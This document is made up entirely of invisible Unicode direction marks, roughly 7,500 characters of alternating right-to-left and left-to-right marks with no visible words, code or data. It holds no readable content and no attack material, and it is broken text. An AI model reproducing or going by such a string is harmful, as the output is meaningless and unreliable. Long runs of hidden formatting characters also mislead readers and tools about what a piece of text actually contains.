‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏